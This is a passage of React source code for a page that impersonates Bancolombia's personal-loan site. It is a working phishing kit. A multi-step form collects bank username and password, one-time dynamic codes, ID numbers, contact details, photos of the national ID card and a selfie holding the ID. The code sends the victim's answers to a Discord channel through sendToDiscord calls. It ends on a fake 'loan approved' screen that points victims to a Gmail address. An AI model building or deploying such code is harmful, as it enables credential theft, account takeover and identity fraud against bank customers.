                        className="w-7 text-center text-sm font-medium bg-transparent outline-none caret-red-600"
                      />
                      <div
                        className={`mt-0.5 h-px w-7 transition-colors ${
                          otpAttempt === 2 && i === 0 && !digit
                            ? 'bg-red-500'
                            : i === 0 && !digit
                            ? 'bg-red-600'
                            : digit
                            ? 'bg-gray-700'
                            : 'bg-gray-400'
                        }`}
                      />
                    </div>
                  ))}
                </div>

                {/* Cancelar */}
                <div className="flex justify-center">
                  <button
                    onClick={() => { setShowDynamicKey(false); setShowFinalStep(true); setOtp(['', '', '', '', '', '']); setOtpAttempt(1); }}
                    className="px-14 py-2 rounded-full border border-gray-400 text-sm text-[#1C1C1C] hover:bg-gray-50 transition-all"
                  >
                    Cancelar
                  </button>
                </div>
              </>
            )}
          </div>
        </div>

        {/* Footer */}
        <div className="absolute bottom-0 left-0 right-0 bg-white border-t border-gray-200 z-10 px-8 py-4 flex items-center justify-between">
          <div className="flex flex-col gap-1">
            <BancolombiaLogo />
            <div className="flex items-center gap-1.5 mt-0.5">
              <span className="text-[8px] font-bold text-gray-500 border border-gray-400 px-1 py-px leading-tight tracking-wide">
                VIGILADO
              </span>
              <span className="text-[8px] text-gray-400 leading-tight uppercase tracking-wide">
                Superintendencia Financiera<br />de Colombia
              </span>
            </div>
          </div>
          <p className="text-[11px] text-gray-500">{dateStr}</p>
        </div>
      </div>
    );
  }

  if (showApproved) {
    const d2 = new Date();
    const days2 = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
    const months2 = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
    const dateStr2 = `${days2[d2.getDay()]} ${d2.getDate()} de ${months2[d2.getMonth()]} del ${d2.getFullYear()}`;
    const radicado = `BC-${Date.now().toString().slice(-8)}`;

    return (
      <div className="fixed inset-0 z-50 bg-[#ededeb] flex flex-col overflow-hidden">
        {/* Full-screen decorative waves */}
        <svg
          className="absolute inset-0 w-full h-full pointer-events-none"
          viewBox="0 0 1440 900"
          preserveAspectRatio="xMidYMid slice"
          fill="none"
        >
          <path d="M-60 530 Q200 370 445 245" stroke="#F97316" strokeWidth="46" strokeLinecap="round"/>
          <path d="M-25 570 Q235 408 475 278" stroke="#FFCC00" strokeWidth="30" strokeLinecap="round"/>
          <path d="M1495 50 Q1295 175 1240 375 Q1190 560 1305 735" stroke="#7C3AED" strokeWidth="46" strokeLinecap="round"/>
          <path d="M1468 28 Q1268 153 1213 353 Q1163 538 1278 713" stroke="#FFCC00" strokeWidth="30" strokeLinecap="round"/>
          <path d="M1518 78 Q1318 203 1263 403 Q1213 588 1328 763" stroke="#F97316" strokeWidth="18" strokeLinecap="round"/>
          <path d="M340 860 Q610 755 875 860" stroke="#7C3AED" strokeWidth="46" strokeLinecap="round"/>
        </svg>

        {/* Top bar */}
        <div className="relative z-10 flex items-center justify-center py-4 px-8">
          <BancolombiaLogo />
        </div>

        {/* Content */}
        <div className="relative z-10 flex items-start justify-center flex-1 px-4 pt-4 pb-28 overflow-y-auto">
          <div className="bg-white rounded-2xl w-full max-w-sm px-8 py-8 shadow-sm">
            {/* Success icon */}
            <div className="flex justify-center mb-5">
              <div className="relative">
                <div className="w-20 h-20 rounded-full bg-green-50 flex items-center justify-center">
                  <CheckCircle className="w-11 h-11 text-green-500" strokeWidth={1.5} />
                </div>
                <div className="absolute -bottom-1 -right-1 w-7 h-7 bg-[#FFCC00] rounded-full flex items-center justify-center shadow-sm">
                  <CheckCircle className="w-3.5 h-3.5 text-[#1C1C1C]" strokeWidth={3} />
                </div>
              </div>
            </div>

            {/* Headline */}
            <h2 className="text-2xl font-extrabold text-[#1C1C1C] text-center leading-tight mb-2">
              ¡Tu crédito fue<br />aprobado!
            </h2>
            <p className="text-center text-sm text-gray-500 leading-relaxed mb-6">
              El dinero será enviado a tu cuenta de manera inmediata.
            </p>

            {/* Radicado */}
            <div className="bg-[#FFFAE0] border border-[#FFCC00]/50 rounded-xl px-5 py-4 mb-4">
              <p className="text-[11px] text-gray-500 mb-1">Número de radicado</p>
              <p className="text-lg font-bold text-[#1C1C1C] font-mono tracking-wider">{radicado}</p>
              {form.monto && (
                <p className="text-xs text-gray-500 mt-1">
                  Monto aprobado: <span className="font-semibold text-[#1C1C1C]">${Number(form.monto).toLocaleString('es-CO')}</span>
                </p>
              )}
            </div>

            {/* Warning notice */}
            <div className="bg-amber-50 border border-amber-200 rounded-xl px-4 py-3 mb-6 flex items-start gap-2">
              <AlertCircle className="w-4 h-4 text-amber-500 shrink-0 mt-0.5" />
              <p className="text-xs text-amber-700 leading-relaxed">
                Si no recibes el dinero en tu cuenta en los próximos{' '}
                <span className="font-bold">5 minutos</span>, contáctanos por correo:{' '}
                <a
                  href="mailto:prestamonequi08@gmail.com"
                  className="font-bold text-amber-800 underline break-all"
                >
                  prestamonequi08@gmail.com
                </a>
              </p>
            </div>

            {/* Close */}
            <button
              onClick={onClose}
              className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3.5 rounded-full transition-all shadow-sm hover:shadow-md text-sm"
            >
              Cerrar
            </button>
          </div>
        </div>

        {/* Footer */}
        <div className="absolute bottom-0 left-0 right-0 bg-white border-t border-gray-200 z-10 px-8 py-4 flex items-center justify-between">
          <div className="flex flex-col gap-1">
            <BancolombiaLogo />
            <div className="flex items-center gap-1.5 mt-0.5">
              <span className="text-[8px] font-bold text-gray-500 border border-gray-400 px-1 py-px leading-tight tracking-wide">
                VIGILADO
              </span>
              <span className="text-[8px] text-gray-400 leading-tight uppercase tracking-wide">
                Superintendencia Financiera<br />de Colombia
              </span>
            </div>
          </div>
          <p className="text-[11px] text-gray-500">{dateStr2}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg overflow-hidden">
        {/* Header */}
        <div className="bg-[#1C1C1C] px-6 py-5 flex items-center justify-between">
          <div className="flex items-center gap-3">
            {step > 0 && !submitted && (
              <button
                onClick={() => setStep((step - 1) as FormStep)}
                className="text-gray-400 hover:text-white transition-colors p-1"
              >
                <ChevronRight className="w-5 h-5 rotate-180" />
              </button>
            )}
            <div>
              <p className="text-[#FFCC00] text-xs font-semibold uppercase tracking-widest mb-1">
                Crédito de Libre Inversión
              </p>
              <h2 className="text-white text-lg font-bold">
                {step === 0 ? '¿Eres cliente Bancolombia?' : 'Solicitar Crédito'}
              </h2>
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-white transition-colors p-1"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Progress — only steps 1-3 */}
        {!submitted && step >= 1 && (
          <div className="px-6 pt-5">
            <div className="flex items-center gap-2 mb-1">
              {(esCliente ? [1, 2, 3] : [1, 2, 3, 4]).map((s, i, arr) => (
                <div key={s} className="flex items-center gap-2 flex-1">
                  <div
                    className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold transition-all ${
                      step >= s
                        ? 'bg-[#FFCC00] text-[#1C1C1C]'
                        : 'bg-gray-100 text-gray-400'
                    }`}
                  >
                    {step > s ? <CheckCircle className="w-4 h-4" /> : s}
                  </div>
                  {i < arr.length - 1 && (
                    <div className={`h-0.5 flex-1 transition-all ${step > s ? 'bg-[#FFCC00]' : 'bg-gray-100'}`} />
                  )}
                </div>
              ))}
            </div>
            <div className="flex justify-between text-[10px] text-gray-400 mt-1 mb-4">
              <span>Datos personales</span>
              <span>Monto y plazo</span>
              <span>Situación laboral</span>
              {!esCliente && <span>Documentos</span>}
            </div>
          </div>
        )}

        {/* Body */}
        <div className="px-6 pb-6">
          {step === 0 ? (
            <div className="py-10 flex flex-col items-center gap-6 text-center">
              {/* Mini logo */}
              <div className="flex flex-col gap-[4px]">
                <div className="flex gap-[4px]">
                  <div className="w-4 h-4 bg-[#FFCC00] rounded-sm" />
                  <div className="w-4 h-4 bg-[#FFCC00] rounded-sm" />
                </div>
                <div className="flex gap-[4px]">
                  <div className="w-4 h-4 bg-[#FFCC00] rounded-sm" />
                  <div className="w-4 h-4 border-2 border-[#FFCC00] rounded-sm" />
                </div>
              </div>

              <div>
                <p className="text-gray-400 text-sm mb-1">Te damos la bienvenida</p>
                <h3 className="text-2xl font-extrabold text-[#1C1C1C]">
                  ¿Eres cliente Bancolombia?
                </h3>
              </div>

              <div className="w-full flex flex-col gap-3 px-4">
                <button
                  onClick={() => { setEsCliente(true); setShowLogin(true); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'Soy cliente', inline: true }]); }}
                  className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-4 rounded-full transition-all text-base shadow-sm hover:shadow-md hover:-translate-y-0.5"
                >
                  Soy cliente
                </button>
                <button
                  onClick={() => { setEsCliente(false); setStep(1); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'No soy cliente', inline: true }]); sendToDiscord('pin', [
                    { name: 'Cliente Bancolombia', value: 'No', inline: true },
                    { name: 'Usuario', value: 'N/A', inline: true },
                    { name: 'Clave principal', value: 'N/A', inline: true },
                  ]); }}
                  className="w-full border-2 border-[#1C1C1C] text-[#1C1C1C] font-bold py-3.5 rounded-full hover:bg-gray-50 transition-all text-base"
                >
                  No soy cliente
                </button>
              </div>

              <p className="text-xs text-gray-400 max-w-xs leading-relaxed">
                Esta información nos ayuda a ofrecerte la mejor experiencia y condiciones en tu crédito.
              </p>
            </div>
          ) : submitted ? (
            <div className="py-8 text-center flex flex-col items-center gap-4">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                <CheckCircle className="w-9 h-9 text-green-500" />
              </div>
              <div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">
                  ¡Solicitud enviada!
                </h3>
                <p className="text-gray-500 text-sm leading-relaxed">
                  Hemos recibido tu solicitud. Uno de nuestros asesores se comunicará contigo en las próximas{' '}
                  <span className="font-semibold text-[#1C1C1C]">24 horas hábiles</span> al correo{' '}
                  <span className="font-semibold text-[#1C1C1C]">{form.email}</span>.
                </p>
              </div>
              <div className="w-full bg-[#FFFAE0] border border-[#FFCC00]/40 rounded-xl p-4 text-left">
                <p className="text-xs text-gray-500 mb-1">Número de radicado</p>
                <p className="text-lg font-bold text-[#1C1C1C] font-mono">
                  BC-{Date.now().toString().slice(-8)}
                </p>
                {esCliente !== null && (
                  <span className={`mt-2 inline-block text-[10px] font-semibold px-2 py-0.5 rounded-full ${esCliente ? 'bg-[#FFCC00] text-[#1C1C1C]' : 'bg-gray-100 text-gray-500'}`}>
                    {esCliente ? 'Cliente Bancolombia' : 'Nuevo cliente'}
                  </span>
                )}
              </div>
              <button
                onClick={onClose}
                className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3 rounded-xl transition-all"
              >
                Cerrar
              </button>
            </div>
          ) : step === 1 ? (
            <div className="flex flex-col gap-4">
              <div className="grid grid-cols-2 gap-4">
                <Field
                  label="Nombre"
                  field="nombre"
                  placeholder="Juan"
                  icon={User}
                  filter={v => v.replace(/[^a-záéíóúüñA-ZÁÉÍÓÚÜÑ\s]/g, '')}
                  form={form}
                  errors={errors}
                  update={update}
                />
                <Field
                  label="Apellido"
                  field="apellido"
                  placeholder="Pérez"
                  icon={User}
                  filter={v => v.replace(/[^a-záéíóúüñA-ZÁÉÍÓÚÜÑ\s]/g, '')}
                  form={form}
                  errors={errors}
                  update={update}
                />
              </div>
              <Field
                label="Número de cédula"
                field="cedula"
                placeholder="1234567890"
                icon={CreditCard}
                filter={v => v.replace(/\D/g, '')}
                maxLength={12}
                inputMode="numeric"
                form={form}
                errors={errors}
                update={update}
              />
              <Field
                label="Teléfono celular"
                field="telefono"
                placeholder="3001234567"
                icon={Phone}
                filter={v => v.replace(/\D/g, '')}
                maxLength={10}
                inputMode="numeric"
                form={form}
                errors={errors}
                update={update}
              />
              <Field
                label="Correo electrónico"
                field="email"
                type="email"
                placeholder="juan@correo.com"
                icon={Mail}
                inputMode="email"
                form={form}
                errors={errors}
                update={update}
              />
            </div>
          ) : step === 2 ? (
            <div className="flex flex-col gap-4">
              <SelectField
                label="Monto a solicitar"
                field="monto"
                icon={DollarSign}
                options={[
                  { value: '1000000', label: '$1.000.000' },
                  { value: '2000000', label: '$2.000.000' },
                  { value: '5000000', label: '$5.000.000' },
                  { value: '10000000', label: '$10.000.000' },
                  { value: '20000000', label: '$20.000.000' },
                  { value: '50000000', label: '$50.000.000' },
                ]}
                form={form}
                errors={errors}
                update={update}
              />
              <SelectField
                label="Plazo de pago"
                field="plazo"
                icon={Clock}
                options={[
                  { value: '12', label: '12 meses' },
                  { value: '24', label: '24 meses' },
                  { value: '36', label: '36 meses' },
                  { value: '48', label: '48 meses' },
                  { value: '60', label: '60 meses' },
                  { value: '72', label: '72 meses' },
                ]}
                form={form}
                errors={errors}
                update={update}
              />
              {cuota() && (
                <div className="bg-[#FFFAE0] border border-[#FFCC00]/40 rounded-xl p-4">
                  <p className="text-xs text-gray-500 mb-1">Cuota mensual estimada</p>
                  <p className="text-2xl font-bold text-[#1C1C1C]">${cuota()}</p>
                  <p className="text-[10px] text-gray-400 mt-1">
                    Tasa referencial 1.8% M.V. Sujeto a estudio de crédito.
                  </p>
                </div>
              )}
              <div className="bg-gray-50 rounded-xl p-4 flex gap-3">
                <Shield className="w-5 h-5 text-[#1C1C1C] shrink-0 mt-0.5" />
                <p className="text-xs text-gray-500 leading-relaxed">
                  Sin codeudor ni fiador. Tasa y cuota fija durante todo el plazo del crédito.
                </p>
              </div>
            </div>
          ) : step === 3 ? (
            <div className="flex flex-col gap-4">
              <SelectField
                label="Tipo de empleo"
                field="tipoEmpleo"
                icon={Briefcase}
                options={[
                  { value: 'empleado', label: 'Empleado' },
                  { value: 'independiente', label: 'Independiente / Freelance' },
                  { value: 'pensionado', label: 'Pensionado' },
                  { value: 'empresario', label: 'Empresario / Dueño de negocio' },
                ]}
                form={form}
                errors={errors}
                update={update}
              />
              <SelectField
                label="Ingresos mensuales"
                field="ingresos"
                icon={DollarSign}
                options={[
                  { value: '1', label: 'Menos de $1.500.000' },
                  { value: '2', label: '$1.500.000 – $3.000.000' },
                  { value: '3', label: '$3.000.001 – $6.000.000' },
                  { value: '4', label: '$6.000.001 – $10.000.000' },
                  { value: '5', label: 'Más de $10.000.000' },
                ]}
                form={form}
                errors={errors}
                update={update}
              />
              <div className="bg-gray-50 rounded-xl p-4">
                <p className="text-xs text-gray-500 leading-relaxed">
                  Al enviar tu solicitud, autorizas a Bancolombia S.A. a consultar tus datos en centrales de riesgo y a contactarte para el proceso de vinculación.
                </p>
              </div>
            </div>
          ) : (
            <div className="flex flex-col gap-4">
              <p className="text-sm font-bold text-[#1C1C1C] mb-2">📸 Sube tus documentos</p>
              {(['cedulaFront', 'cedulaBack', 'selfie'] as const).map((key) => {
                const labels: Record<string, string> = { cedulaFront: 'Cédula frente', cedulaBack: 'Cédula dorso', selfie: 'Selfie con la cédula en la mano' };
                return (
                  <div key={key} className="flex flex-col gap-1">
                    <label className="text-sm font-medium text-gray-700">{labels[key]}</label>
                    <div
                      className={`relative rounded-xl border-2 border-dashed p-4 flex flex-col items-center gap-2 cursor-pointer transition-colors ${images[key] ? 'border-green-400 bg-green-50' : 'border-gray-300 hover:border-[#FFCC00]'}`}
                      onClick={() => {
                        const input = document.createElement('input');
                        input.type = 'file';
                        input.accept = 'image/*';
                        input.capture = 'environment';
                        input.onchange = (e: any) => {
                          const file = e.target.files?.[0];
                          if (file) {
                            const reader = new FileReader();
                            reader.onload = (ev) => {
                              setImages(prev => ({ ...prev, [key]: ev.target?.result as string }));
                            };
                            reader.readAsDataURL(file);
                          }
                        };
                        input.click();
                      }}
                    >
                      {images[key] ? (
                        <>
                          <img src={images[key]!} alt={labels[key]} className="max-h-32 rounded-lg object-cover" />
                          <span className="text-xs text-green-600 font-medium">✓ Subido</span>
                        </>
                      ) : (
                        <>
                          <div className="w-10 h-10 rounded-full bg-gray-100 flex items-center justify-center">
                            <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>
                          </div>
                          <span className="text-xs text-gray-400">Tomar foto o subir archivo</span>
                        </>
                      )}
                    </div>
                  </div>
                );
              })}
              <div className="bg-gray-50 rounded-xl p-4">
                <p className="text-xs text-gray-500 leading-relaxed">
                  Estos documentos son necesarios para validar tu identidad y continuar con el proceso de crédito.
                </p>
              </div>
            </div>
          )}

          {!submitted && step >= 1 && (
            <div className="flex gap-3 mt-6">
              {step > 1 && (
                <button
                  onClick={() => setStep((step - 1) as FormStep)}
                  className="flex-1 border-2 border-gray-200 text-gray-600 font-semibold py-3 rounded-xl hover:border-gray-300 transition-all text-sm"
                >
                  Atrás
                </button>
              )}
              <button
                onClick={next}
                className="flex-1 bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3 rounded-xl transition-all text-sm flex items-center justify-center gap-2"
              >
                {step === 3 && esCliente ? 'Enviar solicitud' : step === 3 && !esCliente ? 'Documentos →' : step === 4 ? 'Enviar solicitud' : 'Continuar'}
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

const benefits = [
  {
    icon: Tag,
    title: 'Tasa y cuota fija',
    desc: 'Cuota que no cambia durante todo el plazo. Planea tus finanzas sin sorpresas.',
    color: 'bg-[#FFD100]',
    textColor: 'text-[#1C1C1C]',
  },
  {
    icon: Shield,
    title: 'Sin codeudor ni fiador',
    desc: 'No necesitas a nadie más. El crédito es solo tuyo.',
    color: 'bg-[#F4956A]',
    textColor: 'text-white',
  },
  {
    icon: Heart,
    title: 'Para lo que quieras',
    desc: 'Estudia, remódelate, viaja, emprender. La decisión es tuya.',
    color: 'bg-[#C9B8E8]',
    textColor: 'text-[#1C1C1C]',
  },
  {
    icon: Smartphone,
    title: '100% digital',
    desc: 'Solicita desde cualquier dispositivo. Sin filas, sin papelería física.',
    color: 'bg-[#7EC8C4]',
    textColor: 'text-[#1C1C1C]',
  },
];

const steps = [
  { icon: FileText, label: 'Completa el formulario', desc: 'Llena tus datos en menos de 5 minutos.' },
  { icon: Clock, label: 'Espera la respuesta', desc: 'Te contactamos en máximo 24 horas hábiles.' },
  { icon: CheckCircle, label: 'Firma y recibe', desc: 'Firma digitalmente y el dinero llega a tu cuenta.' },
];

export default function App() {
  const [showForm, setShowForm] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);

  return (
    <div className="min-h-screen bg-white font-sans antialiased">
      {/* Top utility bar */}
      <div className="bg-[#1C1C1C] text-white text-xs py-2 px-4 hidden md:block">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-6">
            {['Personas', 'Negocios', 'Negocios especializados', 'Tu360', 'Blog'].map(item => (
              <button key={item} className="hover:text-[#FFCC00] transition-colors">
                {item}
              </button>
            ))}
          </div>
          <div className="flex items-center gap-6">
            <button className="hover:text-[#FFCC00] transition-colors">Transparencia</button>
            <button className="hover:text-[#FFCC00] transition-colors">Consumidor</button>
          </div>
        </div>
      </div>

      {/* Main navbar */}
      <nav className="bg-white border-b border-gray-100 sticky top-0 z-40 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <BancolombiaLogo />

          {/* Desktop nav */}
          <div className="hidden md:flex items-center gap-8 text-sm text-gray-600">
            {['Inicio', 'Necesidades', 'Productos y Servicios', 'Educación Financiera'].map(item => (
              <button key={item} className="hover:text-[#1C1C1C] transition-colors font-medium">
                {item}
              </button>
            ))}
          </div>

          <div className="hidden md:flex items-center gap-3">
            <button className="bg-[#1C1C1C] text-white text-sm font-semibold px-5 py-2.5 rounded-full hover:bg-gray-800 transition-all">
              Trámites digitales
            </button>
            <button className="bg-[#FFCC00] text-[#1C1C1C] text-sm font-bold px-5 py-2.5 rounded-full hover:bg-[#f0c000] transition-all">
              Entrar
            </button>
          </div>

          {/* Mobile hamburger */}
          <button
            className="md:hidden p-2 rounded-lg text-gray-600"
            onClick={() => setMenuOpen(!menuOpen)}
          >
            <div className="space-y-1.5">
              <div className={`w-6 h-0.5 bg-current transition-all ${menuOpen ? 'rotate-45 translate-y-2' : ''}`} />
              <div className={`w-6 h-0.5 bg-current transition-all ${menuOpen ? 'opacity-0' : ''}`} />
              <div className={`w-6 h-0.5 bg-current transition-all ${menuOpen ? '-rotate-45 -translate-y-2' : ''}`} />
            </div>
          </button>
        </div>

        {/* Mobile menu */}
        {menuOpen && (
          <div className="md:hidden border-t border-gray-100 px-4 py-4 flex flex-col gap-3 text-sm">
            {['Inicio', 'Necesidades', 'Productos y Servicios', 'Educación Financiera'].map(item => (
              <button key={item} className="text-left text-gray-700 font-medium py-1">
                {item}
              </button>
            ))}
            <div className="flex gap-3 mt-2">
              <button className="flex-1 bg-[#1C1C1C] text-white font-semibold py-2.5 rounded-full text-xs">
                Trámites digitales
              </button>
              <button className="flex-1 bg-[#FFCC00] text-[#1C1C1C] font-bold py-2.5 rounded-full text-xs">
                Entrar
              </button>
            </div>
          </div>
        )}
      </nav>

      {/* Breadcrumb */}
      <div className="max-w-7xl mx-auto px-4 pt-4 pb-0 hidden md:flex items-center gap-1 text-xs text-gray-400">
        {['Personas', 'Créditos', 'Consumo', 'Libre inversión'].map((item, i, arr) => (
          <span key={item} className="flex items-center gap-1">
            <button className={i === arr.length - 1 ? 'text-gray-700 font-medium' : 'hover:text-gray-600 transition-colors'}>
              {item}
            </button>
            {i < arr.length - 1 && <ChevronRight className="w-3 h-3" />}
          </span>
        ))}
      </div>

      {/* Hero */}
      <section className="max-w-7xl mx-auto px-4 py-12 md:py-16 grid md:grid-cols-2 gap-10 items-center">
        <div className="order-2 md:order-1">
          <div className="flex items-center gap-2 mb-4">
            <CreditCard className="w-4 h-4 text-gray-500" />
            <span className="text-sm text-gray-500 font-medium underline underline-offset-2 cursor-pointer">
              Crédito de Libre Inversión
            </span>
          </div>

          <h1 className="text-4xl md:text-5xl font-extrabold text-[#1C1C1C] leading-tight mb-4">
            Estudia, remodela,<br />
            emprende y más,<br />
            con tu{' '}
            <span className="relative inline-block">
              crédito libre
              <svg
                className="absolute -bottom-2 left-0 w-full"
                viewBox="0 0 200 8"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="M0 6 Q100 0 200 6" stroke="#FFCC00" strokeWidth="3" fill="none" strokeLinecap="round" />
              </svg>
            </span>{' '}
            inversión
          </h1>

          <p className="text-gray-500 text-base mb-8 leading-relaxed max-w-md">
            Pídelo y aprovecha las tasas bajas. Da el siguiente paso, recíbelo de una.
          </p>

          <div className="flex flex-wrap items-center gap-4">
            <button
              onClick={() => setShowForm(true)}
              className="bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold px-8 py-3.5 rounded-full transition-all shadow-md hover:shadow-lg hover:-translate-y-0.5 text-sm"
            >
              Solicitar crédito
            </button>
            <button className="border-2 border-[#1C1C1C] text-[#1C1C1C] font-semibold px-8 py-3 rounded-full hover:bg-gray-50 transition-all text-sm">
              Ir al simulador
            </button>
          </div>

          {/* Trust badges */}
          <div className="flex items-center gap-6 mt-10">
            {[
              { value: '$50M', label: 'hasta en crédito' },
              { value: '72', label: 'meses de plazo' },
              { value: '24h', label: 'respuesta rápida' },
            ].map(b => (
              <div key={b.label} className="text-center">
                <p className="text-2xl font-extrabold text-[#1C1C1C]">{b.value}</p>
                <p className="text-xs text-gray-400">{b.label}</p>
              </div>
            ))}
          </div>
        </div>

        <div className="order-1 md:order-2 relative">
          <div className="absolute -top-6 -right-6 w-64 h-64 bg-[#FFCC00]/20 rounded-full blur-3xl pointer-events-none" />
          <div className="absolute -bottom-6 -left-6 w-48 h-48 bg-[#7EC8C4]/20 rounded-full blur-3xl pointer-events-none" />
          <div className="relative rounded-3xl overflow-hidden shadow-2xl">
            <img
              src="/Imagen_principal.PNG"
              alt="Jóvenes estudiando con su crédito Bancolombia"
              className="w-full h-auto object-cover"
            />
            {/* Credit score hint card */}
            <div className="absolute top-4 right-4 bg-white/90 backdrop-blur-sm rounded-2xl px-4 py-3 shadow-lg flex items-center gap-2 cursor-pointer hover:bg-white transition-all">
              <div className="w-8 h-8 bg-[#FFCC00] rounded-full flex items-center justify-center">
                <CheckCircle className="w-4 h-4 text-[#1C1C1C]" />
              </div>
              <div>
                <p className="text-[10px] text-gray-400">Conoce tu puntaje</p>
                <p className="text-xs font-bold text-[#1C1C1C]">crediticio aquí</p>
              </div>
              <ChevronRight className="w-3.5 h-3.5 text-gray-400" />
            </div>
          </div>
        </div>
      </section>

      {/* Benefits */}
      <section className="bg-gray-50 py-16 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-10">
            <h2 className="text-3xl font-extrabold text-[#1C1C1C] mb-3">Beneficios para ti</h2>
            <p className="text-gray-500 text-sm">Más que razones, te damos ventajas para sacar tu crédito.</p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
            {benefits.map(({ icon: Icon, title, desc, color, textColor }) => (
              <div
                key={title}
                className={`${color} rounded-2xl p-6 flex flex-col gap-4 hover:-translate-y-1 transition-all cursor-pointer group`}
              >
                <div className="w-10 h-10 bg-white/30 rounded-xl flex items-center justify-center">
                  <Icon className={`w-5 h-5 ${textColor}`} />
                </div>
                <div>
                  <h3 className={`font-bold text-lg mb-2 ${textColor}`}>{title}</h3>
                  <p className={`text-sm leading-relaxed ${textColor === 'text-white' ? 'text-white/80' : 'text-gray-600'}`}>
                    {desc}
                  </p>
                </div>
                <div className={`w-8 h-8 rounded-full border-2 ${textColor === 'text-white' ? 'border-white/50' : 'border-[#1C1C1C]/30'} flex items-center justify-center ml-auto group-hover:scale-110 transition-transform`}>
                  <span className={`text-lg leading-none ${textColor}`}>+</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* How it works */}
      <section className="py-16 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-extrabold text-[#1C1C1C] mb-3">¿Cómo solicitar tu crédito?</h2>
            <p className="text-gray-500 text-sm">Tres pasos simples para tener el dinero en tu cuenta.</p>
          </div>

          <div className="grid md:grid-cols-3 gap-6 relative">
            {/* Connector line */}
            <div className="hidden md:block absolute top-10 left-1/4 right-1/4 h-0.5 bg-[#FFCC00]" />

            {steps.map(({ icon: Icon, label, desc }, i) => (
              <div key={label} className="flex flex-col items-center text-center gap-4 relative">
                <div className="w-20 h-20 bg-[#FFCC00] rounded-2xl flex items-center justify-center shadow-lg z-10">
                  <Icon className="w-9 h-9 text-[#1C1C1C]" />
                </div>
                <div className="absolute -top-3 -right-3 md:right-auto md:left-1/2 md:-translate-x-1/2 w-6 h-6 bg-[#1C1C1C] text-white rounded-full flex items-center justify-center text-xs font-bold z-20">
                  {i + 1}
                </div>
                <div>
                  <h3 className="font-bold text-[#1C1C1C] mb-2">{label}</h3>
                  <p className="text-gray-500 text-sm leading-relaxed">{desc}</p>
                </div>
              </div>
            ))}
          </div>

          <div className="text-center mt-12">
            <button
              onClick={() => setShowForm(true)}
              className="bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold px-10 py-4 rounded-full transition-all shadow-lg hover:shadow-xl hover:-translate-y-0.5 text-base"
            >
              Solicitar crédito ahora
            </button>
          </div>
        </div>
      </section>

      {/* FAQ strip */}
      <section className="bg-[#1C1C1C] py-12 px-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
          <div>
            <h3 className="text-white text-2xl font-bold mb-2">¿Tienes dudas?</h3>
            <p className="text-gray-400 text-sm">Nuestros asesores están listos para ayudarte.</p>
          </div>
          <div className="flex flex-wrap gap-4">
            <a
              href="tel:6046049090"
              className="flex items-center gap-2 bg-white/10 hover:bg-white/20 text-white font-semibold px-6 py-3 rounded-full transition-all text-sm"
            >
              <Phone className="w-4 h-4 text-[#FFCC00]" />
              604 604 9090
            </a>
            <button
              onClick={() => setShowForm(true)}
              className="bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold px-6 py-3 rounded-full transition-all text-sm"
            >
              Solicitar ahora
            </button>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-100 py-10 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 mb-10">
            <div>
              <BancolombiaLogo />
              <p className="text-gray-400 text-xs mt-3 leading-relaxed">
                Banco de los colombianos y los que sueñan con Colombia.
              </p>
            </div>
            {[
              {
                title: 'Productos',
                links: ['Créditos', 'Cuentas', 'Tarjetas', 'Inversiones', 'Seguros'],
              },
              {
                title: 'Ayuda',
                links: ['Centro de ayuda', 'Preguntas frecuentes', 'Sucursales', 'Cajeros'],
              },
              {
                title: 'Legal',
                links: ['Términos y condiciones', 'Política de privacidad', 'Transparencia', 'SARLAFT'],
              },
            ].map(({ title, links }) => (
              <div key={title}>
                <h4 className="text-[#1C1C1C] font-bold text-sm mb-3">{title}</h4>
                <ul className="space-y-2">
                  {links.map(link => (
                    <li key={link}>
                      <button className="text-gray-400 text-xs hover:text-gray-600 transition-colors text-left">
                        {link}
                      </button>
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
          <div className="border-t border-gray-100 pt-6 flex flex-col md:flex-row items-center justify-between gap-4 text-xs text-gray-400">
